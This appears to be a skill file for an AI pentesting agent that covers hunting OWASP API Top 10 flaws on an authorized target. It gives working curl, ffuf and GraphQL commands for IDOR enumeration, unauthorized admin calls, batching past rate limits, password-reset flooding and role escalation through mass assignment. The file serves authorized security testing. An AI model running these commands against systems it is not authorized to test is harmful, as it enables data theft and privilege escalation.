---
name: hunt-api-abuse
description: >
  Hunt for OWASP API Top 10 abuse: BOLA/IDOR on object IDs, BFLA (missing
  function-level authz), mass assignment via API bodies, excessive data
  exposure in responses, and lack of rate limiting on sensitive endpoints.
  Use when the target exposes a REST/GraphQL/gRPC-JSON API consumed by a
  SPA or mobile app. Keywords: BOLA, BFLA, IDOR, API, REST, GraphQL, Swagger,
  OpenAPI, mass assignment, excessive data exposure, rate limit.
  Do NOT use for pure UI-driven horizontal/vertical access control without
  a distinct API layer — use hunt-broken-access-control. Do NOT use for
  brute-force/credential-stuffing rate limits — use hunt-rate-limiting.
metadata:
  type: hunt
  phase: hunting
  cwe: [CWE-639, CWE-862, CWE-915, CWE-213, CWE-770]
  mitre_attack: [T1557, T1190]
  tools: [burpsuite, ffuf, curl, postman, mitmproxy, arjun]
depends_on: [active-recon, web-crawling]
feeds_into: [chain-analysis]
chains_with: [hunt-broken-access-control, hunt-mass-assignment, hunt-rate-limiting]
---

## Signals

- `/api/`, `/v1/`, `/v2/`, `/graphql`, `swagger.json`, `openapi.yaml` endpoints.
- Numeric or UUID object IDs in paths/bodies (`/api/orders/1042`, `user_id`).
- Mobile app traffic (via proxy) hitting a backend API directly.
- JSON responses with far more fields than the UI renders.
- Two or more privilege tiers in the app (user/admin, free/paid).

## Prerequisites

- At least two accounts at different privilege levels AND two accounts at the same level (for horizontal BOLA testing) — all within authorized test scope.
- Full map of API endpoints: Swagger/OpenAPI spec if public, or reconstructed via crawling + mobile app traffic capture.
- A proxy (Burp/mitmproxy) to diff requests/responses across accounts.

## Methodology

1. **Enumerate the API surface.**
   ```bash
   curl -s https://api.target.com/swagger.json | jq '.paths | keys'
   curl -s https://api.target.com/openapi.json -o openapi.json && jq '.paths | keys' openapi.json
   # no spec published? brute-force common paths
   ffuf -u https://api.target.com/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc 200,201,301,302,401,403 -t 50
   ```

2. **BOLA / IDOR — object-level.** As User A, capture every request touching an object ID. Replay as User B's session/token with User A's object ID:
   ```bash
   curl -s -i https://api.target.com/api/orders/1042 -H "Authorization: Bearer $TOKEN_USER_B"
   # expect 403/404; a 200 with User A's data = BOLA
   ```
   Script it across a range to confirm it's systemic, not a one-off:
   ```bash
   for id in $(seq 1030 1050); do
     code=$(curl -s -o /tmp/resp_$id.json -w "%{http_code}" https://api.target.com/api/orders/$id -H "Authorization: Bearer $TOKEN_USER_B")
     echo "$id -> $code"
   done
   ```

3. **BFLA — function-level.** As a low-privilege user, directly call admin-only endpoints that are hidden in the UI but present in the API/JS bundle:
   ```bash
   # mine the JS bundle for hidden routes first
   curl -s https://app.target.com/static/js/main.bundle.js | grep -oE '"/api/[a-zA-Z0-9/_-]+"' | sort -u
   curl -s -i -X DELETE https://api.target.com/api/admin/users/55 -H "Authorization: Bearer $TOKEN_LOW_PRIV"
   curl -s -i -X POST https://api.target.com/api/admin/settings -H "Authorization: Bearer $TOKEN_LOW_PRIV" -d '{"maintenance":false}'
   ```
   Also test HTTP verb switching on endpoints that check role only for GET: try `PUT`/`PATCH`/`DELETE` with the same path.

4. **Excessive data exposure.** Compare the raw API response against what the UI displays — APIs commonly return full objects (password hashes, internal flags, other users' PII in a list endpoint) and let the frontend filter:
   ```bash
   curl -s https://api.target.com/api/users/me -H "Authorization: Bearer $TOKEN" | jq
   curl -s https://api.target.com/api/users?page=1 -H "Authorization: Bearer $TOKEN" | jq '.[0]'
   ```
   Flag any field not rendered client-side: `password_hash`, `is_admin`, `internal_notes`, `ssn`, `reset_token`, full card numbers.

5. **GraphQL-specific.** If `/graphql` is present, check introspection and abuse batching/aliasing:
   ```bash
   curl -s -X POST https://api.target.com/graphql -H "Content-Type: application/json" \
     -d '{"query":"{ __schema { types { name fields { name } } } } "}' | jq
   # IDOR via node(id:) on a global ID
   curl -s -X POST https://api.target.com/graphql -d '{"query":"{ node(id:\"VXNlcjo1NQ==\") { ... on User { email } } }"}'
   # batching to bypass per-request rate limit
   curl -s -X POST https://api.target.com/graphql -H "Content-Type: application/json" \
     -d '[{"query":"{ user(id:1){email} }"},{"query":"{ user(id:2){email} }"}]'
   ```

6. **Rate limiting on sensitive API endpoints** (export, search, password reset request, OTP send) — confirm absence before escalating to hunt-rate-limiting for exploitation depth:
   ```bash
   for i in $(seq 1 50); do curl -s -o /dev/null -w "%{http_code} " https://api.target.com/api/password/reset -d '{"email":"victim@target.com"}'; done; echo
   ```

7. **Mass assignment via API body** — covered in depth by hunt-mass-assignment; here just confirm the API accepts unexpected JSON keys at all:
   ```bash
   curl -s -i -X PATCH https://api.target.com/api/users/me -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" -d '{"name":"test","role":"admin","is_verified":true}'
   ```

## Tooling

- Burp Suite + **Autorize**/**Auth Analyzer** extensions for automated per-endpoint role diffing.
- `ffuf` for endpoint/parameter discovery.
- `arjun` for hidden parameter discovery on API endpoints: `arjun -u https://api.target.com/api/orders/1042 --headers "Authorization: Bearer $TOKEN"`.
- Postman/Insomnia with environment-switching for multi-account replay.
- `jq` for response diffing.

## Root Causes

- Authorization checks performed only in the frontend/UI router, absent server-side.
- Object ownership never validated — query fetches by ID alone, not `WHERE id=? AND owner_id=?`.
- Role/permission check implemented per-controller inconsistently, missed on newer endpoints.
- Serializers return full ORM objects instead of explicit allow-listed DTOs.
- Rate limiting applied only at the API gateway for unauthenticated traffic, not per-user/per-endpoint.

## Validation Gate (minimum proof)

- BOLA: full request/response pair showing User B's token retrieving User A's object data (redact real PII, keep structure).
- BFLA: request/response showing a low-privilege token executing a state-changing admin action, plus proof the action took effect (follow-up GET showing the change) — **do not execute destructive BFLA without an operator gate per project CLAUDE.md**.
- Excessive data exposure: diff showing a sensitive field present in raw JSON and absent from rendered UI.
- Label each finding Demonstrated/Inferred/Unproven per project rules — a 200 response alone without confirmed data leakage is Inferred at best.

## Gotchas

- **Minimum proof:** a different HTTP status code alone (200 vs 403) is good signal but confirm the *body* actually contains the other user's real data — some APIs return 200 with an empty/generic payload.
- **Common N/A:** IDs are server-generated unguessable UUIDv4 AND ownership is checked — if both hold, BOLA is N/A for that resource; still check BFLA separately.
- **Overclaim trap:** finding an endpoint in the JS bundle that 403s correctly is not a finding — only report what you could actually trigger.
- GraphQL introspection being enabled is not itself a vulnerability — it's a recon aid; don't report it as a standalone finding, fold it into the BOLA/BFLA chain it enabled.
- Rate-limit testing from one IP can get you blocked and burn engagement budget — respect the 3-retry rule in project CLAUDE.md and pivot to hunt-rate-limiting's distributed techniques only with explicit scope.

## Chain Anchors

Before declaring this finding complete, probe these escalation paths:

1. **Rate limit absence** — Is there any rate limit on the abused endpoint, or can it be hit without throttling for mass abuse?
2. **Business logic impact** — Does the abuse pattern (resource exhaustion, enumeration, bulk action) translate into real business impact (cost, data loss, fraud)?
3. **Auth boundary crossing** — Does the abused endpoint let you act on behalf of, or affect, other tenants/users?
4. **Chaining to DoS** — Can the abuse be scaled into a denial-of-service against a shared backend resource (queue, DB connection pool)?

A finding without chain anchor results is INCOMPLETE. Record each anchor as
tested/not-applicable/blocked with the reason.

## Chains & Compositions

- BOLA on `/api/orders/{id}` + predictable sequential IDs → mass data exfiltration (quantify scope, don't dump real data).
- BFLA on admin endpoint + CSRF-able request → privilege escalation triggerable cross-site.
- Excessive data exposure returning password hash → feeds offline cracking (separate skill if present) or hunt-session-management if it exposes session tokens.
- Mass assignment on `role`/`isAdmin` field → direct link to hunt-mass-assignment for the dedicated deep-dive.
- No rate limiting on OTP/reset endpoints → chain into hunt-password-reset and hunt-2fa-bypass.
